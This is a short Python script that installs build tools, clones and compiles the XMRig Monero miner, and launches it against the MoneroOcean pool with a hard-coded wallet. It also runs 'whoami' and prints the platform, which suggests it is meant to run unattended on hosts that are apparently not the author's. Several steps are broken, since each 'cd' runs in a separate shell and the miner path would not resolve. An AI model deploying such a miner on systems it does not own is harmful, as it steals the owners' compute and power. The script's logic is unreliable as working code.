import os
from sys import platform
def build():
  os.system("apt update")
  os.system("apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y")
  #'''
  os.system("git clone https://github.com/xmrig/xmrig.git")
  os.system("cd xmrig")
  os.system("mkdir build")
  os.system("cd build")
  os.system("cmake ..")
  os.system("make")
  #'''
  #os.system("git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. & make")
  
def mine():
  '''
  pool = os.getenv("pool")
  wallet =  os.getenv("wallet")
  name = os.getenv("name")
  #Make sure u have a wallet by this step 
  os.system(f"./xmrig -o gulf.moneroocean.stream:{pool} -u {wallet} -p {name}")
  #'''
  #os.system("cd ")
  os.system("./xmrig -o gulf.moneroocean.stream:10128 -u 42otjFwkWfHNbvA4Fy8jh7GZwynQetyvnGpTNQ24u2QEA7ikkk65cFnAVRUnQZqkzU3m66kZqv9ioiHovdqeEizeJeTGkcT -p rp4")


print(platform)
os.system("whoami")
build()
mine()